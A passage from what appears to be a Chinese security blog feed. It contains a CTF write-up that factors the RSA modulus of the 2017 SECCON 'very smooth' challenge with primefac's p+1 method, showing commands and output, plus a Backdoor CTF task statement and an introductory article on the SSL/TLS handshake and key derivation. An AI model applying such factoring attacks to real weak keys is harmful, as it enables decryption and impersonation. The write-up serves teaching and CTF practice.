input, the number of decimal digits in each prime factor, and the factors’ multiplicities</div><div class="line"></div><div class="line">The -v and -s flags may be combined into a single flag in either order — i.e., into -vs or -sv.</div><div class="line"></div><div class="line">The -m= flag controls the functions used during the multifactor phase. The options are prb, p-1, p+1, ecm, and mpqs, representing Pollard’s rho, Pollard’s p-1, Williams’ p+1, the elliptic curve method, and the multiple polynomial quadratic sieve, respectively. The options must be separated by commas. The options can be repeated: if prb is listed twice, for example, then multifactor will run two instances of pollardRho_brent simultaneously. In the case of prb and ecm, this decreases the expectation value of the time to find a factor, whereas the other three algorithms (p-1, p+1, and MPQS) have no randomized component so that running duplicate instances of these three algorithms confers no benefit. We therefore ignore repeated listings of the latter three methods: for example, calling</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -m primefac -m=prb,prb,ecm,ecm,ecm,mpqs,mpqs 38 ! 1 +</div></pre></td></tr></table></figure>
<p>从上面的说明中可以看出，primefac可以使用多种常用的分解质因数的方法，而rpn时使用逆波兰表示法表示的数。</p>
<h4 id="n-4-整数分解的方法"><a href="#n-4-整数分解的方法" class="headerlink" title="n.4 整数分解的方法"></a>n.4 整数分解的方法</h4><ul>
<li><a href="https://en.wikipedia.org/wiki/Trial_division" target="_blank" rel="external">Trial division</a></li>
<li><a href="https://en.wikipedia.org/wiki/Wheel_factorization" target="_blank" rel="external">Wheel factorization</a></li>
<li><a href="https://en.wikipedia.org/wiki/Pollard%27s_rho_algorithm" target="_blank" rel="external">Pollard&#39;s rho algorithm</a></li>
<li><a href="https://en.wikipedia.org/wiki/Algebraic-group_factorisation_algorithms" target="_blank" rel="external">Algebraic-group factorisation algorithms</a>, among which are <a href="https://en.wikipedia.org/wiki/Pollard%27s_p_%E2%88%92_1_algorithm" target="_blank" rel="external">Pollard&#39;s <em>p</em> − 1 algorithm</a>, <a href="https://en.wikipedia.org/wiki/Williams%27_p_%2B_1_algorithm" target="_blank" rel="external">Williams&#39; <em>p</em> + 1 algorithm</a>, and <a href="https://en.wikipedia.org/wiki/Lenstra_elliptic_curve_factorization" target="_blank" rel="external">Lenstra elliptic curve factorization</a></li>
<li><a href="https://en.wikipedia.org/wiki/Fermat%27s_factorization_method" target="_blank" rel="external">Fermat&#39;s factorization method</a></li>
<li><a href="https://en.wikipedia.org/wiki/Euler%27s_factorization_method" target="_blank" rel="external">Euler&#39;s factorization method</a></li>
<li><a href="https://en.wikipedia.org/wiki/Special_number_field_sieve" target="_blank" rel="external">Special number field sieve</a></li>
</ul>
<h3 id="0xn-1-ctf中范例"><a href="#0xn-1-ctf中范例" class="headerlink" title="0xn+1 ctf中范例"></a>0xn+1 ctf中范例</h3><h4 id="n-1-1-2017-SECCON-very-smooth"><a href="#n-1-1-2017-SECCON-very-smooth" class="headerlink" title="n+1.1 2017 SECCON very smooth"></a>n+1.1 2017 SECCON very smooth</h4><p>将题目从文件中binwalk出来之后，发现了一个证书，给出了大整数n</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">python -m primefac -vs -m=p+1  149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897</div><div class="line"></div><div class="line">149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897: p+1 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897</div><div class="line">Z309  =  P155 x P155  =  11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 x 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897</div></pre></td></tr></table></figure>
<p>至于这里为什么只能用Williams&#39;s <em>p</em> + 1 算法而不能用 Pollard&#39;s p − 1 算法分解，其原因可能如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">➜ python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002</div><div class="line"></div><div class="line">1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002: 2 7 43 503 761429 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823</div><div class="line">Z154  =  P1 x P1 x P2 x P3 x P6 x P142  =  2 x 7 x 43 x 503 x 761429 x 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823</div><div class="line"></div><div class="line">➜ python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 </div><div class="line"></div><div class="line">1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000: 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5</div><div class="line">Z154  =  P1^185 x P1^62 x P1^97  =  2^185 x 3^62 x 5^97</div></pre></td></tr></table></figure>
<p>其实从此处看出，对于 p-1 确实有很多小因子，但是个数太多，这就会使得进行枚举的时候出现指数爆炸的情况，因此没有分解出来。</p>
<h4 id="n-1-2-2018-Backdoor-Awesome-mix2"><a href="#n-1-2-2018-Backdoor-Awesome-mix2" class="headerlink" title="n+1.2 2018 Backdoor Awesome-mix2"></a>n+1.2 2018 Backdoor Awesome-mix2</h4><p>这道题是一道验证题，但是需要解决一个问题：</p>
<p>已知s，m，（都是不超过1024位的大整数），求使得 $s^e=m(mod n)$ 的 e和n，约束条件是:</p>
<p>$e&gt;=3, n&gt;=s, n.bit_length &lt;= 1025$</p>
]]></content>
      
        <categories>
            
            <category> crypto </category>
            
        </categories>
        
        
        <tags>
            
            <tag> rsa </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[深度解读SSL/TLS实现]]></title>
      <url>/2018/03/20/%E6%B7%B1%E5%BA%A6%E8%A7%A3%E8%AF%BBSSL-TLS%E5%AE%9E%E7%8E%B0/</url>
      <content type="html"><![CDATA[<h3 id="一-前言"><a href="#一-前言" class="headerlink" title="一 前言"></a><strong>一 前言</strong></h3><p>SSL/TLS协议是网络安全通信的重要基石，本系列将简单介绍SSL/TLS协议，主要关注SSL/TLS协议的安全性，特别是SSL规范的正确实现。 本系列的文章大体分为3个部分：</p>
<ul>
<li>SSL/TLS协议的基本流程</li>
</ul>
<ul>
<li>典型的针对SSL/TLS协议的攻击</li>
</ul>
<ul>
<li>SSL/TLS协议的安全加固措施</li>
</ul>
<p>本文对SSL/TLS协议概况做基本介绍，包括SSL/TLS协议的版本变迁，协议的详细流程以及流行的SSL/TLS协议实现。文章的主要内容翻译自波鸿鲁尔大学Christopher Meyer的文章《20 Years of SSL/TLS Research An Analysis of the Internet’s Security Foundation》，同时也根据作者自己的理解增加了部分内容，以使对SSL/TLS协议的介绍更为完整。</p>
<h3 id="二-什么是SSL-TLS"><a href="#二-什么是SSL-TLS" class="headerlink" title="二 什么是SSL/TLS?"></a><strong>二 什么是SSL/TLS?</strong></h3><p>SSL全称是Secure Sockets Layer，安全套接字层，它是由网景公司(Netscape)设计的主要用于Web的安全传输协议，目的是为网络通信提供机密性、认证性及数据完整性保障。如今，SSL已经成为互联网保密通信的工业标准。</p>
<p>SSL最初的几个版本(SSL 1.0、SSL2.0、SSL 3.0)由网景公司设计和维护，从3.1版本开始，SSL协议由因特网工程任务小组(IETF)正式接管，并更名为TLS(Transport Layer Security)，发展至今已有TLS 1.0、TLS1.1、TLS1.2这几个版本。</p>
<p>如TLS名字所说，SSL/TLS协议仅保障传输层安全。同时，由于协议自身特性(数字证书机制)，SSL/TLS不能被用于保护多跳(multi-hop)端到端通信，而只能保护点到点通信。</p>
<p>SSL/TLS协议能够提供的安全目标主要包括如下几个：</p>
<blockquote>
<p>认证性——借助数字证书认证服务器端和客户端身份，防止身份伪造</p>
<p>机密性——借助加密防止第三方窃听</p>
<p>完整性——借助消息认证码(MAC)保障数据完整性，防止消息篡改</p>
<p>重放保护——通过使用隐式序列号防止重放攻击</p>
</blockquote>
<p>为了实现这些安全目标，SSL/TLS协议被设计为一个两阶段协议，分为握手阶段和应用阶段：</p>
<p>握手阶段也称协商阶段，在这一阶段，客户端和服务器端会认证对方身份(依赖于PKI体系，利用数字证书进行身份认证)，并协商通信中使用的安全参数、密码套件以及MasterSecret。后续通信使用的所有密钥都是通过MasterSecret生成。</p>
<p>在握手阶段完成后，进入应用阶段。在应用阶段通信双方使用握手阶段协商好的密钥进行安全通信。</p>
<p>SSL/TLS协议有一个高度模块化的架构，分为很多子协议，如下图所示：</p>
<p><img src="/images/2018-03-20/wKiom1VSr0jhhvpTAABYsKaYnzU344.jpg" alt="enter image description here"></p>
<p>Handshake协议：包括协商安全参数和密码套件、服务器身份认证(客户端身份认证可选)、密钥交换;</p>
<p>ChangeCipherSpec 协议：一条消息表明握手协议已经完成;</p>
<p>Alert 协议：对握手协议中一些异常的错误提醒，分为fatal和warning两个级别，fatal类型的错误会直接中断SSL链接，而warning级别的错误SSL链接仍可继续，只是会给出错误警告;</p>
<p>Record 协议：包括对消息的分段、压缩、消息认证和完整性保护、加密等。</p>
<h3 id="三-协议流程详解"><a href="#三-协议流程详解" class="headerlink" title="三 协议流程详解"></a><strong>三 协议流程详解</strong></h3><p>本节对SSL/TLS协议的流程进行详细介绍。一个典型的TLS 1.0协议交互流程如下图所示：</p>
<p><img src="/images/2018-03-20/wKiom1VSr0jQHxwLAACUNCBE000413.jpg" alt="enter image description here"></p>
<p>每一个SSL/TLS链接都是从握手开始的，握手过程包含一个消息序列，用以协商安全参数、密码套件，进行身份认证以及密钥交换。握手过程中的消息必须严格按照预先定义的顺序发生，否则就会带来潜在的安全威胁。今年顶级安全会议CCS 有文章提出了建立综合状态机来检查SSL链接中消息序列……</p>
<h4 id="3-1-握手过程中的消息序列"><a href="#3-1-握手过程中的消息序列" class="headerlink" title="3.1 握手过程中的消息序列"></a><strong>3.1 握手过程中的消息序列</strong></h4><p>ClientHello：ClientHello通常是握手过程中的第一条消息，用于告知服务器客户端所支持的密码套件种类、最高SSL/TLS协议版本以及压缩算法。</p>
<p>ClientHello中还包含一个随机数，这个随机数由4个字节的当前GMT UNIX时间以及28个随机选择的字节组成，共32字节。该随机数会在密钥生成过程中被使用。</p>
<p>另外，ClientHello中还可能包含客户端支持的TLS扩展。(TLS扩展可以被用来丰富TLS协议的功能或者增强协议的安全性)</p>
<p><img src="/images/2018-03-20/wKioL1VSsMLSO9wFAAAcPnOfb8U691.jpg" alt="enter image description here"></p>
<p>ServerHello：服务器接受到ClientHello后，会返回ServerHello。服务器从客户端在ClientHello中提供的密码套件、SSL/TLS版本、压缩算法列表里选择它所支持的项，并把它的选择包含在ServerHello中告知客户端。接下来SSL协议的建立就基于服务器选择的密码套件类型、SSL/TLS协议版本以及压缩算法。</p>
<p>ServerHello中同样会包含一个随机数，同样4+28 字节类型，由服务器生成。</p>
<p><img src="/images/2018-03-20/wKioL1VSsMKSspYqAAAZUQ7F42w765.jpg" alt="enter image description here"></p>
<p>Certificate：客户端和服务器都可以发送证书消息来证明自己的身份，但是通常客户端证书不被使用。 服务器一般在ServerHello后会接一条Certificate消息，Certificate消息中会包含一条证书链，从服务器证书开始，到Certificate authority(CA)或者最新的自签名证书结束。下图形象地描述了证书链：</p>
<p><img src="/images/2018-03-20/wKiom1VSr0izoCpBAABVvBbdOIE370.jpg" alt="enter image description here"></p>
<p>SSL中使用的证书通常是X.509类型证书，X.509证书的内容如下表所示：</p>
<p><img src="/images/2018-03-20/wKiom1VSr0jjInKFAABxEC_m-lI181.jpg" alt="enter image description here"></p>
<p>在用的X.509证书包含Version 1和Version 3两种版本，其中v1版本的证书存在安全隐患，同时不支持TLS扩展，被逐渐弃用。现在大多数在用的SSL证书都是V3版本。</p>
<p>同时证书会附带与协商好的密钥交换算法对应的密钥。密钥交换算法以及它们所要求的密钥类型如下表所示。</p>
<p><img src="/images/2018-03-20/wKioL1VSsMKgTEBbAACbL3WUxBo700.jpg" alt="enter image description here"></p>
<p>ServerKeyExchange：该消息仅当以下密钥交换算法被使用时由服务器发出：</p>
<p>RSA_EXPORT(仅当服务器的公钥大于512bit时)、DHE_DSS、DHE_DSS_EXPORT、DHE_RSA、DHE_RSA_EXPORT、DH_anon 使用其它密钥交换算法时，服务器不能发送此消息。</p>
<p>ServerkeyExchange消息会携带这些密钥交换算法所需要的额外参数，以在后续步骤中协商PreMasterSecret。这些参数需要被签过名。</p>
<p><img src="/images/2018-03-20/wKioL1VSsMPRSovPAAAU9RkXbck920.jpg" alt="enter image description here"></p>
<p>CertificateRequest：这个消息通常在要求认证客户端身份时才会有。消息中包含了证书类型以及可接受的CA列表。</p>
<p>ServerHelloDone：服务器发送这条消息表明服务器部分的密钥交换信息已经发送完了，等待客户端的消息以继续接下来的步骤。这条消息只用作提醒，不包含数据域。</p>
<p>ClientKeyExchange：这条消息包含的数据与所选用的密钥交换算法有关。</p>
<p>如果选择的密钥交换算法是RSA，那么消息包含的参数为用服务器RSA公钥(包含在之前证书中的或者是ServerKeyExchange中的)加密过的PreMasterSecret，它有48个字节，前2个字节表示客户端支持的最高协议版本，后46个字节是随机选择的。</p>
<p>如果选择的密钥交换算法是DH或者DHE，则可能有两种情况：</p>
<p>隐式DH公开值：包含在Certificate消息里;</p>
<p>显示DH公开值：公开值是本消息的一部分。</p>
<p>CertificateVerify：这条消息用来证明客户端拥有之前提交的客户端证书的私钥。</p>
<p>Finished：表明握手阶段结束。这是第一条用协商的算法和密钥保护的消息。</p>
<p>因为是用协商好的密钥加密的消息，它可以用来确认已经协商好的密钥。</p>
<p>同时Finished消息包含一个verify_data域，可以用来校验之前发送和接收的信息。</p>
<p>Verify_data域是一个PRF函数的输出(pseudo-random function)。这个伪随机函数的输入为：(1)两个hash值：一个SHA-1，一个MD5，对之前握手过程中交换的所有消息做哈希;(2)the MasterSecret，由预备主密钥生成;(3)finished_label，如果客户端发送的则是”client finished”，服务器发送的则是”server finished”。关于这个PRF的细节在3.3节中会具体描述。 此外，Finished 消息不能够在ChangeCipherSpec前发送。</p>
<h4 id="3-2-不同密钥交换算法对应的握手过程"><a href="#3-2-不同密钥交换算法对应的握手过程" class="headerlink" title="3.2 不同密钥交换算法对应的握手过程"></a><strong>3.2 不同密钥交换算法对应的握手过程</strong></h4><p>不同的密钥交换算法对应的握手过程中的消息序列是不同的，相应的实现方式也不同，本节介绍几个常见密钥交换算法对应的握手过程。</p>
<p>TLS-RSA：在这个场景下，PreMasterSecret是由客户端指定的，并用RSA公钥加密发送给服务器。服务器不影响PReMasterSecret的生成。</p>
<p><img src="/images/2018-03-20/wKiom1VSr0jwrDFUAACg_BdyVr8383.jpg" alt="enter image description here"></p>
<p>TLS-DH：基于DH的密钥交换也被称为静态Diffie-Hellman。在这种场景下，可能是双方各自提交一个证书包含DH公开值，或者服务器端提交证书包含DH公开值，客户端在每次会话中选择一个值。协商好的DH值被用作PreMasterSecret。显然证书中的参数是固定的，那么每次链接的PreMasterSecret也是相同的。</p>
<p>TLS-DH不能提供前向安全性。</p>
<p><img src="/images/2018-03-20/wKiom1VSr0jBzNudAACY8GWuQpE314.jpg" alt="enter image description here"></p>
<p>TLS-DHE：基于DHE的TLS握手中会有ServerKeyExchange消息。握手过程中交换参数的认证通过数字签名来实现，支持的签名算法包括RSA和DSS。DH参数会有它的数字签名一起被包含在ServerKeyExchange中被发送出去。客户端在ClientKeyExchange中返回它的公开DH参数，但没有签名保护。同样协商出来的DH密钥被用作PreMasterSecret。</p>
<p><img src="/images/2018-03-20/wKioL1VSsMOiw4cbAACo6Xepd10940.jpg" alt="enter image description here"></p>
<h4 id="3-3-密钥生成"><a href="#3-3-密钥生成" class="headerlink" title="3.3 密钥生成"></a><strong>3.3 密钥生成</strong></h4><p>Pseudo-random Function(PRF)：伪随机函数是SSL协议中的一个重要组成部分，它被用来秘密扩展以及生成密钥。在3.1节讲解Finished消息时已经简单提及PRF，在这里我们详细讨论PRF的工作原理。SSL/TLS协议中的PRF如下图所示：</p>
<p><img src="/images/2018-03-20/wKioL1VSsMOC93_VAABj0w3MQLc312.jpg" alt="enter image description here"></p>
<p>这个PRF基于两个hash函数：MD5和SHA-1，它有3个输入，一个Secret(比如PreMasterSecret)，一个标志符(比如”client finished”, “server finished”)，还有一个种子值(比如客户端随机数+服务器端随机数)。</p>
<p>Secret在使用时被分为长度相同的两半：S1和S2，分别作为P_MD5和P_SHA-1的输入。</p>
<p>PRF的输出按如下方式处理得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PRF( secret , label , seed ) = P_MD5( S1 , label + seed ) XOR P_SHA−1(S2 , label + seed ) ;</div></pre></td></tr></table></figure>
<p>P_MD5和P_SHA-1都是扩展函数，用来扩展秘密值以用于密钥生成，它们的计算方式如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">P_hash (secret , seed) = HMAC_hash(secret , A( 1 ) + seed ) +HMAC hash(secret , A( 2 ) + seed ) +HMAC hash(secret , A( 3 ) + seed ) + . . .</div></pre></td></tr></table></figure>
<p>其中A(0) = seed, A(i) = HMAC_hash( secret, A( i −1) )</p>
<p><img src="/images/2018-03-20/wKiom1VSr0mSF2yoAAA_IOcXyB4627.jpg" alt="enter image description here"></p>
<p>这个秘密扩展会一直进行直到得到足够多的扩展数据。 Key Derivation：主密钥(MasterSecret)是利用上述PRF从预备主密钥(PreMasterSecret)生成的。每个MasterSecret为48字节，生成方式如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">master_secret = PRF(pre mastersecret, &quot;master secret&quot; , ClientHello.random + ServerHello.random)</div></pre></td></tr></table></figure>
<p>得到MasterSecret后，它会被进一步处理最后生成4个不同的密钥和2个初始向量(IV)。处理过程如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">key_block = PRF( SecurityParameters.mastersecret , &quot;key expansion&quot; , SecurityParameters.server_random + SecurityParameters.client_random ) ;</div></pre></td></tr></table></figure>
<p>处理过程一直持续到足够多的输出被生成，然后把输出分为4个key和2个IV：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">client_write_MAC_secret，server_write_MAC_secret, client_write_key, server_write_key, client_write_IV, server_write_IV.</div><div class="line"></div><div class="line">Client_MAC = key_block[:MAC_LENGTH*2].decode(&apos;hex&apos;)</div><div class="line">Server_MAC = key_block[MAC_LENGTH*2:MAC_LENGTH*4].decode(&apos;hex&apos;)</div><div class="line">Client_KEY = key_block[MAC_LENGTH*4:MAC_LENGTH*4+KEY_LENGTH*2].decode(&apos;hex&apos;)</div><div class="line">Server_KEY = key_block[MAC_LENGTH*4+KEY_LENGTH*2:MAC_LENGTH*4+KEY_LENGTH*4].decode(&apos;hex&apos;)</div><div class="line">Client_IV = key_block[MAC_LENGTH*4+KEY_LENGTH*4:MAC_LENGTH*4+KEY_LENGTH*4+IV_LENGTH*2].decode(&apos;hex&apos;)</div><div class="line">Server_IV = key_block[MAC_LENGTH*4+KEY_LENGTH*4+IV_LENGTH*2:MAC_LENGTH*4+KEY_LENGTH*4+IV_LENGTH*4].decode(&apos;hex&apos;)</div><div class="line"></div><div class="line">MAC_LENGTH = 20</div><div class="line">KEY_LENGTH = 32</div><div class="line">IV_LENGTH = 16</div><div class="line">REQ_BYTES = 2*(MAC_LENGTH + KEY_LENGTH + IV_LENGTH)</div></pre></td></tr></table></figure>
<p>下图完整阐述了SSL/TLS协议中的密钥生成过程。</p>
<p><img src="/images/2018-03-20/wKiom1VSr0mi8fJKAADXBCsKs5U659.jpg" alt="enter image description here"></p>
<h3 id="四-从SSL到TLS"><a href="#四-从SSL到TLS" class="headerlink" title="四 从SSL到TLS"></a><strong>四 从SSL到TLS</strong></h3><p>本节介绍SSL/TLS协议的版本变迁，不同版本的区别以及安全特性等。</p>
<p>SSL 1.0由于从来没有被公开过，并且存在严重安全漏洞，我们就不讨论了。</p>
<p>SSL 2.0：SSL 2.0于1995年4月被发布。SSL 2.0中主要存在的问题如下：</p>
<p>MAC不能覆盖填充长度域，攻击者可能利用这点破坏消息完整性;</p>
<p>缺乏握手认证，攻击者可以篡改密码套件列表，诱骗通信双方使用较弱的密码套件;</p>
<p>使用较弱的或有问题的密码算法(如MD5，RC4等)，或者使用不安全的分组模式(如CBC模式);</p>
<p>对于不同的密码学基元使用相同的密钥，违背基本安全常识。</p>
<p>由于以上安全问题，RFC 6176已经明确提出避免使用SSL 2.0，但是现实生活中还有少量客户端和服务器支持SSL 2.0.</p>
<p>SSL 3.0：SSL 3.0引入了一些新的特性和机制解决了很多之前版本存在的漏洞。此外，SSL 3.0中引入了ChangeCipherSpec子协议。SSL 3.0向后兼容SSL 2.0，相对于SSL 2.0，它的主要改变包括以下几点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">支持更多的密码套件(支持更多的密码算法如DSS，SHA-1)</div><div class="line">在握手阶段支持密钥协商(DH和FORTEZZA)</div><div class="line">支持密码学参数的重协商</div><div class="line">增加了消息压缩选项</div><div class="line">MAC能够覆盖填充长度域了，同时MAC可以使用MD5或者SHA-1</div><div class="line">不同的密码学基元使用不同的key</div><div class="line">Alert子协议能对任何错误给出两种提示：Warning和Fatal</div><div class="line">中止链接的时候会用一个close_notify警告通知通信双方</div><div class="line">支持证书链，而非单个证书</div><div class="line">通过Finished消息认证所有发送和接收的消息</div><div class="line">加密了的PreMasterSecret包含当前使用的协议版本，防止协议回滚</div></pre></td></tr></table></figure>
<p>TLS 1.0：TLS 1.0和SSL 3.0差别非常小。实际上，TLS 1.0是SSL 3.1，在IETF接手后改名为TLS。TLS 1.0版本是目前使用最广泛的SSL/TLS协议版本。</p>
<p>TLS 1.0不再支持使用FORTEZZA的密码套件。</p>
<p>TLS 1.0中MAC被替换成HMAC。</p>
<p>之前提到ChangeCipherSpec消息必须在Finished消息前发送，在TLS 1.0中，如果消息序列不符合这个要求，会产生FATAL警告并终止链接。</p>
<p>TLS 1.1：这个版本相比之前改动也很小。最重要的改动是预防了针对CBC分组模式的一些攻击。现在的填充错误变的和非法MAC错误不可区分了，防止攻击者利用可区分错误响应建立解密预言机对密文进行攻击。</p>
<p>在每次加密过程中，使用CBC分组模式时，都需要显示给出IV，而不用再密钥生成时使用PRF生成IV。</p>
<p>此外，TLS 1.1禁止为适应之前出口限制而使用弱化的密码套件。</p>
<p>TLS 1.2：这是最新的版本，部署的还比较少。这个版本禁用了PRF中的MD5和SHA-1，而用一个可配置的hash函数取代了它们，这样的修改简化了计算过程。修改后的PRF风格如下：</p>
<p><img src="/images/2018-03-20/wKioL1VSsMOAbmeUAAA4m4cRNC8287.jpg" alt="enter image description here"></p>
<p>此外，TLS 1.2的一个重要变化是支持认证加密模式(支持GCM等)。但是由于一些AEAD(Authenticated Encryption with Associated Data)密码算法要求IV为隐式的，所以IV又恢复到由MasterSecret生成，即TLS 1.0以前的风格。</p>
<p>TLS 1.2支持使用GCM、CCM的新密码套件。</p>
<p>同时SSL 2.0被宣布放弃，不再向后兼容SSL 2.0.</p>
<p>下图</p>
<h3 id="五-SSL-TLS的流行实现"><a href="#五-SSL-TLS的流行实现" class="headerlink" title="五 SSL/TLS的流行实现"></a><strong>五 SSL/TLS的流行实现</strong></h3><p>本节简单介绍一下流行的SSL/TLS实现库，SSL协议非常复杂，由开发者自己实现常常会出错，开发者在具体实现SSL协议时通常会依赖于这些密码学库。</p>
<h4 id="5-1-常见的SSL-TLS-实现"><a href="#5-1-常见的SSL-TLS-实现" class="headerlink" title="5.1 常见的SSL/TLS 实现"></a><strong>5.1 常见的SSL/TLS 实现</strong></h4><p>OpenSSL：这是非常流行的开源SSL/TLS实现。</p>
<p>OpenSSLim完全用C语言实现，支持SSL 2.0/3.0，TLS 1.0/1.1/1.2以及DTLS 1.0。</p>
<p>OpenSSL 近年来出现了很多的安全漏洞，比如2014年曝出的著名的Heartbleed漏洞等。</p>
<p>JSSE：这是使用Java实现的，支持SSL 3.0，TLS 1.0/1.1/1.2.</p>
<p>Bouncy Castle：它不仅仅支持SSL/TLS，它是一个完整的密码学库，支持各种密码学算法和协议。不过它仅仅支持TLS 1.0版本。</p>
<p>Android平台主要使用这个密码学库。</p>
<p>GnuTLS：这是另一个用C语言实现的库，支持SSL 3.0，TLS 1.0/1.1/1.2以及DTLS 1.0。主要在Unix世界被使用。同时以各种安全漏洞多而闻名。</p>
<p>NSS：这是最初由网景公司(Netscape)开发的库，支持SSL 2.0/3.0，TLS 1.0/1.1，现在主要被浏览器和客户端软件使用，比如Firefox使用的就是NSS库，Chrome使用的是一个NSS库的修正版。</p>
<p>下表是一些常见软件以及它们所使用的SSL/TLS实现库的情况：</p>
<p><img src="/images/2018-03-20/wKioL1VSsMOyVFihAACtevi7ULc810.jpg" alt="enter image description here"></p>
<p>其它还有一些常用的SSL实现库，如cryptlib、CyaSSL、MatrixSSL、PolarSSL等，由于市场占有率不高，我们这里就不多做介绍了。</p>
<h4 id="5-2-流行SSL-TLS实现库的安全研究"><a href="#5-2-流行SSL-TLS实现库的安全研究" class="headerlink" title="5.2 流行SSL/TLS实现库的安全研究"></a><strong>5.2 流行SSL/TLS实现库的安全研究</strong></h4><p>最近几年曝出的高风险SSL安全漏洞大多跟SSL实现库有关，比如2014年4月曝出的“心脏滴血”漏洞，存在于OpenSSL 1.0.1-1.0.1f版本中，影响全球近17%的Web服务器;同样是2014年曝出的苹果公司iOS 7.0.6版本系统中存在的“gotofail”漏洞，因为程序员的疏忽导致SSL证书校验中的签名校验失效;包括今年曝出的SSL Freak攻击也是由于SSL实现库的安全漏洞导致的攻击，我们研究小组的同学对这个攻击有详细的分析，参见《SSL Freak来袭：如何实施一个具体的SSL Freak攻击》。同时我们还开发了一个基于python的中间人代理攻击框架“风声”对某国内知名电商的服务器进行具体的攻击，并上报了漏洞。</p>
<p>考虑到大量SSL/TLS实现库中存在安全问题，同时这些主流的SSL/TLS实现库对开发者而言使用难度较高，比如有些SSL/TLS实现库要求开发者自己进行随机数生成或密钥管理，让缺乏系统信息安全知识培训的开发者去使用这样高度复杂的密码学库容易产生很多安全问题。我们在这里推荐一些高级密码学库：Google keycazer、NaCl、Cryptlib、GPGME。这些密码学库存在的安全问题较少，同时封装了一些底层的密码学操作，降低了开发者的使用难度。</p>
<p>以上就是本次要介绍的SSL /TLS协议基本知识，后续的文章我们会对一些典型SSL/TLS攻击进行具体介绍。</p>
]]></content>
      
        <categories>
            
            <category> crypto </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ssl </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[服务器端题目搭建]]></title>
      <url>/2018/03/20/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/</url>
